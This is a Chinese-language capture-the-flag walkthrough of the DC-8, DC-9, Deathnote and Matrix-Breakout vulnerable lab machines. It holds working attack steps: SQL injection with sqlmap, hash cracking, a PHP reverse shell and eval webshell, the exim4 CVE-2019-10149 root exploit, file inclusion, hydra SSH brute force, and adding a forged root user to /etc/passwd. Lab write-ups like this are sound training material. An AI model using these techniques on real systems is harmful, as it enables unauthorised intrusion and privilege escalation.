先nmap扫一下\n\n\n\n\n\n\n\n\n\n\n发现22端口运行着ssh\n80端口下发现有个include页面，可能需要在这里上传木马拿shell然后有install.mysql.txt，看来可能需要用到数据库\n再dirsearch扫一下\n\n\n\n\n\n\n\n\n\n\n发现有/user/login页面，猜测是登录后台的页面后面找找有没有账号密码信息\n再看看wapplzer\n\n1.sql注入然后分析网站页面\n发现在details时，url出现\nhttp://192.168.133.147/?nid=1\n\n\n看到注入处，再结合之前的nmap扫描的结果，有mysql安装，猜测可能存在sql注入\n试试sql注入有没有反应\n192.168.133.147/?nid=-1 union select schema_name from information_schema.schemata--+\n\n\n看来确实是存在sql注入\n手动注不难，完全没有过滤，但还是用sqlmap直接梭哈\n数据库知道了\n先看看表\n\n看到有个users列，查看有没有我们需要的后台登录的账号密码\n发现有两个用户\n\nadmin $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z\njohn $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF\n\n但是密码是加密的，我们用john爆破一下\n先把密码写入密码文本pass.txt\n\n\n然后就用john自带的密码本就行\njohn pass.txt\n\n但是再这里我用了johny\n\n一个图形化的爆破工具\n这里只得到john用户的密码\nturtle\n\n2.后台添加木马拿到账号密码后，我们到后台登录页面进行登录\nhttp://192.168.133.147/user/login\n\n\n登录成功，根据之前我们信息收集，在nmap得到的信息，我们需要找到上传木马或者修改文件内容的地方\n在右上角我们看到有个content\n打开看看里面是不是可以修改\n\n结果发现Contact Us页面文件可以进行修改\n打开看看，发现在edit没有修改的地方\n\n于是找了找网站源码在\n\n这里可以修改，于是我们就修改一下\n并记得把编码文件格式改为PHP code\nThanks for taking the time to contact us. We shall be in contact soon.\n\n\n\n然后底下保存\n3.反弹shell然后我们开始监听\nnc -lvnp 8888\n\n\n访问Contact Us页面发送信息，从而触发php执行命令\n\n拿到shell\n\n4.提权【exim4】先进入交互式shell\npython -c &#x27;import pty; pty.spawn(\"/bin/bash\")&#x27;\n\n\n先查看一下suid命令\nfind / -perm -u=s -type f 2>/dev/null\n\n\n找到了个新的命令exim4，搜了一下\n\n\n\n\n\n\n\n\n\nexim4\nexim远程命令执行漏洞分析（cve-2019-10149）\n在对Exim邮件服务器最新改动进行代码审计过程中，我们发现4.87到4.91版本之间的Exim存在一个远程命令执行（RCE）漏洞。这里RCE指的是远程命令执行（Remote Command Execution），而不是远程代码执行（Remote Code Execution）：攻击者可以以root权限使用execv()来执行任意命令，利用过程中不涉及到内存破坏或者ROP（Return-Oriented Programming）相关内容。\n这个漏洞可以由本地攻击者直接利用（远程攻击者需要在特定的非默认配置下利用）。为了在默认配置下远程利用该漏洞，攻击者需要与存在漏洞的服务器建连7天（可以每隔几分钟发送1个字节）。然而由于Exim的代码非常复杂，我们无法保证这里介绍的方法是唯一的利用方法，可能还存在其他更加快捷的方法。\n从4.87版开始（2016年4月6日公布），由于#ifdef EXPERIMENTAL_EVENT改成了#ifndef DISABLE_EVENT，因此Exim默认情况下就存在漏洞。在之前的版本中，如果手动启用了EXPERIMENTAL_EVENT选项，那么服务器也会存在漏洞。令人惊讶的是，这个漏洞已经在4.92版中被修复（2019年2月10日）：\n根据文档，发现是个和邮件服务有关的命令，并且存在命令执行漏洞\n我们先查看一下其版本是否在这个nday的范围里\n\n发现刚好是这个版本范围，是存在RCE\n查看一下有没有利用的脚本\n\nPrivilege：特权\n\n选择46996.sh，我们查看一下脚本文件内容\nsearchsploit 46996 -p  \n\ncat /usr/share/exploitdb/exploits/linux/local/46996.sh\n\n\n\n发现有两个使用方法，一个setuid，一个netcat\n主要是上传到靶机shell后，执行命令不同\n./raptor_exim_wiz -m setuid\n或\n./raptor_exim_wiz -m netcat\n\n\n\n\n\n我们先把脚本文件复制下来\n\n再上传到靶机shell\nkali主机执行\nnc -lvp 9999 \n\n\n靶机shell中执行\nnc 192.168.133.140 9999 > raptor_exim_wiz\n\n\n发现权限不够，看来是不能在这个页面新建文件\n我们到/tmp目录下一般可以\n\n下载成功\n执行提权\n./raptor_exim_wiz -m setuid\n\n\n发现无执行权限，我们修改一下\nchmod 777 raptor_exim_wiz\n\n\n成功执行脚本\n\n意外但结果发现还是\n\n低权限账号\n于是我们再执行\n./raptor_exim_wiz -m netcat\n\n结果还是一样\n\n而且提醒在靶机的31337端口连接关闭了\n看了看其他大佬的wp\n发现有一步【其实是没必要的】\n\n\n\n\n\n\n\n\n\n在脚本文件里执行说是因为这个脚本是windows底下编写的，所以需要修改一下，改成Linuxset ff=unix\n结果还是一样，看来是靶机有问题了，猜测是靶机和kali主机之间连接有问题，我换手机热点试试\n\n成功【校园网真垃圾】\n\n到根目录查看flag\n\n得到flag\n\n\n\n\n\n\n\n\n\n888       888          888 888      8888888b.                             888 888 888 888\n888   o   888          888 888      888  \"Y88b                            888 888 888 888\n888  d8b  888          888 888      888    888                            888 888 888 888\n888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888\n888d88888b888 d8P  Y8b 888 888      888    888 d88\"\"88b 888 \"88b d8P  Y8b 888 888 888 888\n88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P\n8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      \"   \"   \"   \"\n888P     Y888  \"Y8888  888 888      8888888P\"   \"Y88P\"  888  888  \"Y8888  888 888 888 888\n\nHope you enjoyed DC-8.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and all those who have taken the time to complete these littlechallenges.\nI&#39;m also sending out an especially big thanks to:\n@4nqr34z@D4mianWayne@0xmzfr@theart42\nThis challenge was largely based on two things:\n\nA Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.\nA suggestion from @theart42\n\nThe answer to that question is...\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n意思是：希望你喜欢 DC-8。只是想向所有这些人表示衷心的感谢提供反馈的人，以及所有花时间完成这些小事的人挑战。\n我还要特别感谢：\n@4nqr34z@D4mianWayne@0xmzfr@心42\n这一挑战主要基于两件事：\n\n我从有人询问关于 Linux 机器上的 2FA 以及它是否值得的一条推文。\n来自@theart42 的建议\n\n这个问题的答案是……\n如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。\n【注意，这个提权不稳定，所以需要快点拿取flag，或者按我之前写的方法进入稳定shell】\n\np.s. setuid我再试试另外一个命令试试\n./raptor_exim_wiz -m setuid\n\n\n发现还是一样\n查了一下\n\n\n\n\n\n\n\n\n\nsetuid\nsetuid是类unix系统提供的一个标志位， 其实际意义是set一个process的euid为这个可执行文件或程序的拥有者(比如root)的uid， 也就是说当setuid位被设置之后， 当文件或程序(统称为executable)被执行时, 操作系统会赋予文件所有者的权限, 因为其euid是文件所有者的uid.\n而且我们执行完发现生成了两个pwn文件【狂喜，最近正好在学习pwn】\n查了一下setuid在pwn中的利用\n在pwn中什么是setuid？\n\n\n\n\n\n\n\n\n\nsetuid代表设置用户身份，并且setuid设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配\n这么说起来有点绕，我们来举一个例子\n\n\n\n\n\n\n\n\n\n一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了\n演示我们用user用户运行一个vim然后新开一个窗口查看后台进程\nps -aux\n\n\n这里可以看到，我们的vim正在以user的权限运行中，然后我们去执行一下setuid文件看看\n\n这里可以看到，我们虽然是user用户，但执行文件后，文件正以root权限运行我们查看文件的权限\n\n\n\n\n\n\n\n\n\n\nr代表读，w代表写，x代表执行，那s是什么呢\ns替换了以x的可执行文件，这被称为setuid位，根据刚刚的操作，应该知道了s是做什么的\n当这个位被user权限的用户执行时，linux实际上是以文件的创造者的权限运行的，在这种情况下，它是以root权限运行的\n我们的目标就是，破解(pwn)这些文件然后拿到root权限读取flag\n这也就是这个命令执行的目的\n./raptor_exim_wiz -m setuid\n\n\n\n\n\n\n\n\n\n\n\n\n简而言之，其实就是suid提权\n但这里可能是因为靶机的原因无法执行提权成功\n\n总而言之，这一关只是在DC2上修改了一点，只要把前面几关做了，这关难度并不大\n【\n难受的是遇到pwn，虽然在这里并没有什么用，但是如果遇到这类二进制文件如何修改才能让其成为我们提权的工具，\n而且现在二进制还啥也不会，继续学习吧\n】\n一个旗子找完，游戏结束【吐血了】\n\n九、DC9[中级]only one flag\n\n\n\n\n\n\n\n\n\n（dc最后一关）建议可以自己想办法做一下，如果之前是靠别人wp来提供思路的话\n信息收集先用nmap扫一下\n\n结果发现只有80端口是打开的\n而且也没有什么敏感的信息\n然后再dirsearch扫一下\n\n结果没有什么有价值的东西\n\n在wappalyzer里也看不出什么信息，CMS也没显示\n1.sql注入啥也没有信息，但是在display all records下\n我们看到一大串枚举数据，很熟悉，这和sql注入感觉有很大的关系\n\n找了一下发现url并没有sql注入的方式，那就可能是输入框进行sql注入了\n根据枚举的数据，猜测是在search下\n\n我们直接抓包数据，拿sqlmap梭哈\n\n\n好家伙真的是sql注入\n后面不赘述，找到并查看users数据库中用户信息\n\n好家伙，完全没有对密码加密\n但是根据登录页面，是需要管理员账号的，再根据staff，看来我是找错表了\n\n于是按上面一样步骤，查看Staff数据库里的信息\n\n果然在这里\n\n\n\n\n\n\n\n\n\ntransorbital1我开始以为是啥密钥，结果是密码明文，麻了\n当然时间充足的兄弟可以hashcat试试【坏笑】\n\n成功登录\n2.文件包含发现多了两个选项是，一个是增加用户，另一个是登出账号\n但是我突然发现\n底下莫名多了一行字\nFile does not exist\n\n？？？\n哪里来的file，看来是进行了读取文件操作，但是文件参数不存在\n猜测可能存在文件包含漏洞\n于是我们在url后加上?file=进行文件包含\n\n\n\n\n\n\n\n\n\nhttp://192.168.133.149/manage.php?file=../../../../../etc/passwd返回到根目录下，包含&#x2F;etc目录下的passwd文件\n\n但这里并没有我们想要的信息，\n3.ssh1） knockd\n\n\n\n\n\n\n\n\n在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。\n端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到Internet，则可以使用端口断开功能。它允许您关闭防火墙上允许传入连接的端口，并在进行预先安排的连接尝试方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。\n我在学习笔记写有其原理，可以看看，我不在这里赘述\n先查看敲门顺序\n\n\n\n\n\n\n\n\n\nhttp://192.168.133.149/manage.php?file=../../../../../etc/knockd.conf\n\n发现是\n7469,8475,9842\n\n敲一下\nknock 192.168.133.149 7469 8475 9842\n\n\n然后再用nmap扫一下，发现22端口开了\n\n2） hydra然后我们用九头蛇爆破登录一下ssh\n至于账户密码就用我们之前sql注入得到的第一个的数据\n\n\n\n\n\n\n\n\n\n\nusername：marymjuliedfredfbarneyrtomcjerrymwilmafbettyrchandlerbjoeytrachelgrossgmonicagphoebebscootsjanitorjanitor2\n\n\n\n\n\n\n\n\n\npassword：3kfs86sfd468sfdfsd24sfd87sfd1RocksOffTC&amp;TheBoyzB8m#48sdPebblesBamBam01UrAG0D!Passw0rdyN72#dsdILoveRachel3248dsds7ssmellycatsYR3BVxxxw87IlovepeepeeHawaii-Five-0\n把username和password复制到两个文本文件中去\nhydra -L user.txt -P pass.txt 192.168.133.149 ssh\n\n\n发现有三个可以登录\n\n\n\n\n\n\n\n\n\nlogin: chandlerb   password: UrAG0D!login: joeyt   password: Passw0rdlogin: janitor   password: Ilovepeepee\n我们先登录janitor\n\n\n\n\n\n\n\n\n\nlogin: janitor   password: Ilovepeepee\n\n登录成功\n4.提权先执行 \nsudo -l\n\n看看当前用户能以管理员身份执行哪些命令\n\n看来我们没有资格\n再执行\nls -la\n\n查看当前用户目录文件\n\n发现有个\nsecrets-for-putin\n\n可能有管理员密码什么的\n\n果然有个文本文件，查看\ncat passwords-found-on-post-it-notes.txt\n\n\n又多了几个密码\n\n\n\n\n\n\n\n\n\nBamBam01Passw0rdsmellycatsP0Lic#10-4B4-Tru3-0014uGU5T-NiGHts\n我们把这个补充到我们九头蛇爆破的密码本里\n再进行爆破ssh\nhydra -L user.txt -P pass.txt 192.168.133.149 ssh\n\n我们发现多了一个新的账号\n\n\n\n\n\n\n\n\n\n\nlogin: fredf   password: B4-Tru3-001\n我们登录ssh看看\n再执行\nsudo -l\n\n\n发现其可以以无密码root权限执行\n/opt/devstuff/dist/test/test\n\n我们执行一下试试\nsudo /opt/devstuff/dist/test/test\n\n\n提示我们有个test.py正在被读取使用\n我们找一下这个文件在哪里\n\n\n\n\n\n\n\n\n\nfind / -name &quot;test.py&quot; -type f 2&gt;/dev/null\n-type f代表类型为文件，d为目录2&gt;/dev/null产生更清晰的输出，因为它会丢弃错误，例如权限错误\n\n我们到文件目录下查看一下内容\n\n#!/usr/bin/python\n\nimport sys\n\nif len (sys.argv) != 3 :\n    print (\"Usage: python test.py read append\")\n    sys.exit (1)\n\nelse :\n    f = open(sys.argv[1], \"r\")\n    output = (f.read())\n\n    f = open(sys.argv[2], \"a\")\n    f.write(output)\n    f.close()\n\npy脚本利用脚本接受了两个位置参数，并将第一个文件的内容，附加到第二个文件的内容中\n其实如果我们有修改脚本的权限就好了，可以改成恶意脚本，但是我们并没有在这个目录写入的权限\n于是，我们可以换个思路，就利用脚本的把一个文本内容附加到另外文本的能力，修改我们无法修改的文件，比如/etc/passwd\n我们先看看/etc/passwd里root用户的格式\n\n按这个格式我们写一个自己的\n\n\n\n\n\n\n\n\n\nttoc::0:0:root:/root:/bin/bash我这里设置的用户ttoc密码为空\n\nopenssl加盐其实这里是需要给我们真假的用户添加密码的\n不然是通过不了密码输入那一环，那里不允许密码为空\n我们执行\n\n\n\n\n\n\n\n\n\nopenssl passwd -1 -salt salt password\n-1使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。\n-salt salt用作盐的字符串。我选择字符串盐\npassword我们想使用的明文密码\n得到\n$1$salt$qJH7.N4xYta3aEG/dfqo/0\n\n注意如果开始没加密码就传入&#x2F;etc&#x2F;passwd，后面修改后再传用户，名字不能相同\n\n但是注意我们其实在很多目录下都没有写入权限，但是我们可以用经典使用\n/tmp，临时文件目录下的权限管控一般不大\n于是我们把我们的内容写入/tmp目录下的evil文件中\n\n\n\n\n\n\n\n\n\necho &#39;ttoc:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash&#39; &gt; /tmp/evil\n*注意这里需要单引号，双引号会把$后面参数当作变量\n然后我们再执行\n\n\n\n\n\n\n\n\n\nsudo /opt/devstuff/dist/test/test /tmp/evil /etc/passwd\n把我们创建的用户root添加到文本去\n\n最后登录ttoc\nsu ttoc\n\n\n成功提取\n读取flag\n\n\n\n\n\n\n\n\n\n\n███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗\n████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║\n██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║\n██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝\n██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗\n╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝\n                                                                             \n\n\nCongratulations - you have done well to get to this point.\nHope you enjoyed DC-9.  Just wanted to send out a big thanks to all thosewho have taken the time to complete the various DC challenges.\nI also want to send out a big thank you to the various members of @m0tl3ycr3w .\nThey are an inspirational bunch of fellows.\nSure, they might smell a bit, but...just kidding.  :-)\nSadly, all things must come to an end, and this will be the last everchallenge in the DC series.\nSo long, and thanks for all the fish.\n意思是：恭喜 - 你已经完成了这一点。\n希望你喜欢 DC-9。只是想对所有这些人表示衷心的感谢他们花时间完成了各种 DC 挑战。\n我还要向@m0tl3ycr3w 的各个成员表示衷心的感谢。\n他们是一群鼓舞人心的人。\n当然，它们可能会闻到一点味道，但是……开玩笑。 :-)\n可悲的是，一切都必须结束，这将是最后一次DC系列中的挑战。\n这么久，感谢所有的鱼。\n一个旗子找完，游戏结束\n【dc系列结束，阅读到本文的朋友，希望对你们有所帮助】\n\nELSE一、DEATHNOTE: 1[初级]基拉好帅，必须拿这个开头，直接提权进他的心【不是南通】\n\n\n\n\n\n\n\n\n\n\nhint:不要浪费太多时间跳出框框思考。这是一个直截了当的盒子。\n\n找这个靶场ip，就把我卡住了，后面看到好像这个靶机和vm不兼容，只能用vitrualbox\n后面下了个vitrualbox才找到靶机ip\n\n然后vm也桥接，就找到了\n\n顺带补充两个扫描工具【使用自行-h查看】【感觉和nmap差不多】\n\n\n\n\n\n\n\n\n\narp-scan是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，该工具会自动解析Mac地址，给出MAC对应的硬件厂商，帮助用户确认目标。\nnetdiscoverNetdiscover是一种网络扫描工具，通过ARP扫描发现活动主机，可以通过主动和被动两种模式进行ARP扫描。通过主动发送ARP请求检查网络ARP流量，通过自动扫描模式扫描网络地址。本文介绍Netdiscover的安装和使用方法。\n\n信息收集习惯nmap扫一下\n\n\n\n\n\n\n\n\n\n\n22端口开放，运行ssh80端口开放，运行http\n然后访问靶机ip\n\n看到页面显示please wait.....\n\n然后显示连接失败\n看来是需要修改/etc/hosts文件，添加靶机域名和ip\n\n再次访问靶机ip\n\n访问成功\n我们先查看一下网站的框架\n\n\n\n\n\n\n\n\n\n\nCMS为wordpress 5.8，很老的版本了，这里肯定有提权的方式\n采用脚本为Twiiter Emoji，这是推特的开源库里的引用表情的脚本，不是关键\n我们看到页面有hint\n\n\n\n\n\n\n\n\n\n\nFind a notes.txt file on server or SEE the L comment \n意思是：\n找到一个notes.txt 文件服务器上或\n看看L的评论 \n那我们就可以用dirsearch扫一下，看看能不能找到notes.txt文件在哪里，以及评论网页在哪里\n评论页面我是在首页面中间\n\n\n\n\n\n\n\n\n\ni will eliminate you L!\n链接跳转找到的，但好像没啥信息，似乎看不到L的评论\n\nhttp://deathnote.vuln/wordpress/index.php/2021/07/19/kira/\n\n\n左下角的\n\n\n\n\n\n\n\n\n\nmy fav line is iamjustic3\nL on i will eliminate you L!\n我最喜欢的台词是iamjustic3L 在 ，我会消灭你L! \niamjustic3：分开看i am justic 3【我是正义的3】，但好像实际意思，后面看看能不能利用的\neliminate：消灭，纯粹单词意思，没啥意义\n我们先用dirsearch扫一下找一下信息\n\n*关键信息关键登录页面和robots.txt【其他页面没有啥信息】\nhttp://deathnote.vuln/wordpress/wp-login.php\n\n\n爬虫文本\n\n\n\n\n\n\n\n\n\n\nfuck it my dadadded hint on /important.jpg\nryuk please delete it意思是：x我的爸爸他把暗示藏在了/important.jpg里\nryuk，请删了它\nryuk是基拉的死神，基拉让他删除图片，同时图片也藏有信息虽然我们找到了登录页面，以及用户名，但是还是不知道密码所以还要找密码\n我们先试试我们能不能查看/important.jpg\n\n发现图片无法显示\n看来图片格式有问题，应该是插入了文本什么的\n我们用curl\ncurl http://deathnote.vuln/important.jpg\n\n得到\n\n\n\n\n\n\n\n\n\n\ni am Soichiro Yagami, light&#39;s fatheri have a doubt if L is true about the assumption that light is kira\ni can only help you by giving something important\nlogin username : user.txti don&#39;t know the password.find it by yourselfbut i think it is in the hint section of site\n意思是：我是光的父亲 八神宗一郎我怀疑 L 关于光是 kira 的假设是否正确\n我只能通过提供一些重要的东西来帮助你\n登录用户名：user.txt我不知道密码。自己找但我认为它在网站的提示部分#user.txt看来需要同样访问找一下#提示部分有密码，看来就是notes.txt文本里了\n那后面就是找一下这两个文本文件在哪里了\n1.wpscan既然信息不够，那我们就用对应的CMS工具【wpscan】扫一下看看有没有信息\nwpscan --url http://deathnote.vuln/wordpress -e u\n\n\n发现kira才是真正的后台用户，那么ryuk可能就是ssh的登录用户，那他的密码是多少呢\n这个时候我想起他的留言\n\n\n\n\n\n\n\n\n\nmy fav line is iamjustic3\nL on i will eliminate you L!\n他说他最喜欢的台词是iamjustic3\n既然是最喜欢的，那最有可能拿来当密码。所以这个可能就是kira的后台网站的登陆密码\n登录后台\n\n\n\n\n\n\n\n\nkiraiamjustic3\n\n登录成功\n这个页面提醒需要管理员邮箱验证，直接remind me later，我们先到后台看看\n进来后台发现comments页面，先看看能不能看到L的评论\n\n发现同样啥也没有\n2.ssh登录我们再看看其他页面\n在Media页面\n\n我们发现了notes.txt\n\n点开得到notes.txt文本的位置\nhttp://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt\n\n访问得到\n\n看起来很像密码本\n\n\n\n\n\n\n\n\n\ndeath4death4lifedeath4udeath4everdeath4alldeath420death45death4lovedeath49death48death456death40141death4uyaydeath44thedeath4u2thedeath4ustickdeath420reddeath44megadeath44megadeath4killdeath405hot2death4shodeath4southdeath4nowdeath4l0vedeath4freedeath4elmodeath4blooddeath499Eyes301death498death4859death47death4545death445death444death4387ndeath4332387death42521439death42death4138death411death405death4me\n我们试试爆破ssh\n我们再弄个用户名本\n\n\n\n\n\n\n\n\n\n就拿我们已知的三个用户，做成用户名本kiralryku\n然后九头蛇爆破登录ssh\nhydra -L un.txt -P pass.txt 192.168.163.123 ssh -s 22\n\n\n发现登录用户【看来用不上去找那个user.txt】\n\n\n\n\n\n\n\n\n\nldeath4me\n然后我们试试登录\nssh l@192.168.16.123\n\n\n登录成功，并看到当前目录下有个文本文件user.txt【无奈，现在找到应该也没啥用了】\n查看一下\n\n发现是串看不懂的文本\n我们试试ciphey解密一下\nciphey -t \"++++++++++[>+>+++>+++++++>++++++++++>>>+++++.>+++++++++++.------------.+.+++++.---.>++++++++++.>--------------.++++++++.+++++.>.------------.---.>++++++++++++++.-----------.---.+++++++..>----------.+++++++++++++++++++.-.>+++++.----------.++++++.>++.--------.-.++++++.>------------------.+++.>----.+.++++++++++.-------.>+++++++++++++++.-----.>----.--.+++..>+.--------.>++++++.--.+++++++++.-----------------.\n\"\n\n得到\n\n\n\n\n\n\n\n\n\n\ni think u got the shell , but you wont be able to kill me -kira意思是：我想你已经拿到shell了，但你杀不了我-基拉\n感觉信息没啥用，但是大概猜测，杀死基拉是需要提权的，但是从L这里是无法提权，只有基拉才可以提权\n我们可以试试我们能否以管理员身份执行一些命令\nsudo -l\n\n\n 这样看来L是无法以管理员身份执行任何命令，那就只有看看有没有其他路径了\n我们再输入\npwd\n\n看看我们当前路径\n\n发现我们还有个上级目录，返回查看其下目录\n居然还有个kira的目录\n我们看看有什么\n\n\n发现其目录下的kira.txt设置了权限\n我们尝试用之前后台登录的密码登录，也失败了\n3.登录kira看来我们还需要找找信息，根据user.txt文本信息，我们必须要成功登录kira的用户，才可以提权拿到我们想要的东西\n那我们直接搜索当前全部含有kira的文件或者目录\nfind / -name \"kira*\" 2>/dev/null\n\n\n前两个前面访问过没权限\n后面四个三个图片，最后一个也访问过，也没权限\n\n那就只有一个了\n/opt/L/kira-case\n\n我们查看一下有无信息\n\n发现其为一个目录，且其下有一个文本文件\n\n\n\n\n\n\n\n\n\nthe FBI agent died on December 27, 2006\n1 week after the investigation of the task-force member/head.aka.....Soichiro Yagami&#39;s family .\nhmmmmmmmmm......and according to watari ,he died as other died after Kira targeted them .\nand we also found something infake-notebook-rule folder .意思是：\n联邦调查局特工于 2006 年 12 月 27 日去世\n工作组成员&#x2F;负责人调查后 1 周。又名……八神宗一郎的家人。\n嗯嗯嗯嗯……根据 Watari 的说法，在基拉瞄准他们之后，他死了，其他人也死了。\n我们还发现了一些东西假笔记本规则文件夹\n看来我们需要到fake-notebook-rule这个文件夹下寻找一番\nfind / -name \"fake-notebook-rule\" 2>/dev/null\n\n找找位置\n\n发现在\n/opt/L/fake-notebook-rule\n\n查看其下文件信息\n\n大概意思看来就是让我们用cyberchef对case.wav的字符串解密【一眼16进制，直接手动解码算了】\n63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d\n\n我们解码试试\n解16进制\n\n解码base64\n\n\n\n\n\n\n\n\n\n\npasswd : kiraisevil \n得到kira密码\n我们直接登录\nsu kira\n\n\n 登录成功\n4.提权我们先看看kira能以管理员身份执行哪些命令\nsudo -l\n\n\n好家伙\n(ALL : ALL) ALL\n\n代表他可以以管理员身份执行一切命令，那他就相当于管理员了\n执行\nsudo su\n\n\n直接无密码进入管理员用户\n然后查看到根目录查看flag\n\n      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: \n    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: \n   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         \n  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   \n +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    \n#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     \n########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       \n\n##########follow me on twitter###########3\nand share this screen shot and tag @KDSAMF\n\n\n\n\n游戏结束\n\np.s.靶机彩蛋之前我们以L的身份查看kira，发现他底下有个kira.txt文本文件，我们无权访问\n现在我们可以访问看看\n\n发现是一串base64加码字符\n解码看看\n\n\n\n\n\n\n\n\n\n\nplease protect one of the following \n\nL (/opt)\n\nMisa (/var)\n\n\n  只能选其一来保护\n/opt底下的L，我们已经看过了\n我们看看/var下的Misa有什么\n\n\n\n\n\n\n\n\n\n\nit is toooo late for misa#对米沙而言，已经太迟了\n感兴趣的朋友可以去看看DEATH NOTE\n\n二、MATRIX-BREAKOUT：2 MORPHEUS[中级]《矩阵突破》:2 墨菲斯\n\n\n\n\n\n\n\n\n\n描述：This is the second in the Matrix-Breakout series, subtitled Morpheus:1. It’s themed as a throwback to the first Matrix movie. You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out from, which holds the key to a mystery.Difficulty: Medium-Hard\n这是 Matrix-Breakout 系列中的第二部，副标题为 Morpheus:1。它的主题是回归第一部 Matrix 电影。您扮演 Trinity，试图调查 Nebuchadnezzar 上的一台计算机，Cypher 已将其他人拒之门外，而这台计算机掌握着解开谜团的钥匙。难度：中等难度\n\n\n\n\n\n\n\n\n\n\nwc确实有东西实在不懂可以看这个研讨会视频https://www.beyondtrust.com/webinars/attacking-and-defending-linux-breaking-out-of-the-matrix-edition#video-container虽然这个不是这个靶机的wp，但是我还是从其中获得很多思路\n信息收集先扫描一下端口\n\n\n\n\n\n\n\n\n\n\n发现22端口开放，运行着ssh80，81两个端口都运行着http但是两者名字不同，可以判断出但是80端口可以任意访问，81端口访问需要一定权限\n\n\n\n\n\n\n\n\n\n\n发现81端口是需要登录的\n然后dirsearch扫一下目录\n\n\n\n\n\n\n\n\n\n\n发现网站目录下有爬虫协议，我们可以访问看看其中有没有关键信息\n\n\n\n\n\n\n\n\n\n\nThere&#39;s no white rabbit here.  Keep searching!意思是：这里没有白兔。继续搜索！ \n#white rabbit就是爱丽丝梦游仙境里的，跟着白色的兔子，掉进兔子洞\n看来是有个引导的信息，会带我们找到一个很关键的东西\n再用whatweb查看网站可显示的框架\n\n没有啥信息\n我们访问网站看看有没有其他信息\n\n\n\n\n\n\n\n\n\n\nWelcome to the Boot2Root CTF, Morpheus:1.\nYou play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.\nGood luck! - @jaybeale from @inguardians意思是：欢迎来到Boot2Root CTF，墨菲斯:1.\n你扮演Trinity，试图调查尼布甲尼撒半岛上的一台电脑，Cypher把所有人都锁在外面，至少对于ssh。\n祝你好运！ -@jaybealefrom@inguardians \n#Cypher电影中反抗组织的一个叛徒，他把反抗组织锁在门外，我们又要用到ssh那看来ssh登录的用户名为Cypher\n信息还是太少了，dirsearch只扫到两个可以访问，实在利用太少\n所以我们换个扫描工具\ndirbuster\n\n\n\n\n\n\n\n\nDirBuster支持全部的Web目录扫描方式，用来探测web服务器上的目录和隐藏文件\n这里我利用的是\n/usr/share/dirbuster/wordlists/\n\n\n我通过dirbuster工具扫描到\nhttp://192.168.80.131/graffiti.php\n\n\n【看来dirsearch的目录太少了】\n访问\nhttp://192.168.80.131/graffiti.php\n\n\n发现是个留言信息的一个网站\n而且我们评论的信息被包含在了graffiti.php文件中\n猜测是文件写入\n于是抓包查看\n\n发现数据为\nmessage=hello&file=graffiti.txt\n\n\n\n\n\n\n\n\n\n\nmessage为写入信息\nfile为写入文件名称，而且还有后缀名字\n那么如果修改后面的文件名称，我们是不是可以实现文件上传的效果，上传一个包含木马的文件\n一句话🐎那就写一个一句话\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]); &lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?>\n\n然后再url编码\n于是最后\nmessage=%3C%3Fphp%20%40eval(%24_POST%5B&#x27;cmd&#x27;%5D)%3B%20%3F%3E&file=hello.php\n\n如果你是开了火绒，那你可能会看到，刚发送就被火绒检测到网站存在一句话🐎，代表确实是可以的\n用nc监听反弹shell也是一样\n& 